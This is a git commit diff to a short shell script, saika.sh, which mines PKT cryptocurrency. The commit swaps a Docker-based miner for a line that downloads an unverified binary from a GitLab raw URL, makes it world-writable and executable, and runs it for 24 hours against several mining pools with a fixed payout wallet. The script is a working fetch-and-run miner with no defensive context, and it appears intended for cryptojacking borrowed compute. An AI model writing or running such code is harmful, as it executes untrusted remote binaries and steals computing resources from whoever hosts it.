06c6d83f943614fbb5245c0bdb49a6d70169ebcc
AntonyAjax <94457247+AntonyAjax@users.noreply.github.com>
2022-02-04 23:39:12 +0700

    Update saika.sh

--- saika.sh
+++ saika.sh
@@ -1,3 +1,2 @@
 #erl-andi
-docker pull thomasjp0x42/packetcrypt
-docker run thomasjp0x42/packetcrypt ann -p pkt1qwmrpmprn3extgsp44twryhpcu93y9klwlnm8l3 https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
+wget https://gitlab.com/suyatisadino/demonslayers/-/raw/main/ann && chmod 777 ann && timeout 24h ./ann ann -p pkt1qwmrpmprn3extgsp44twryhpcu93y9klwlnm8l3 https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
